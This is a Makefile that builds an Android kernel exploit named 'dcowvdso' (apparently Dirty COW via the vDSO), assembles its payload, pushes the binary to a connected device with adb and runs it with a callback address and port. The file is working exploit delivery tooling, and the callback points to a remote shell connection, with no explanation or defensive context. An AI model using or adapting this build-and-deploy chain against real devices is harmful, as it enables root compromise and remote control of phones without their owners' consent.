
ARCH := $(shell adb shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)

all: build

build:
	echo INFO: If you successfully ran the exploit and the /data/b file was created, delete the /data/b file, otherwise the remote won\'t connect to the local socket.
	../ndk/bin/yasm -f bin payload.s && xxd -i payload payload.h
	/home/user/adb/android-ndk-r21d/ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)
	adb push libs/$(ARCH)/dcowvdso /data/local/tmp/dcowvdso
	adb shell /data/local/tmp/dcowvdso '10.0.2.17:1234'

clean:
	rm -rf libs
	rm -rf obj
	rm payload
	rm payload.h

rb:
	adb shell reboot
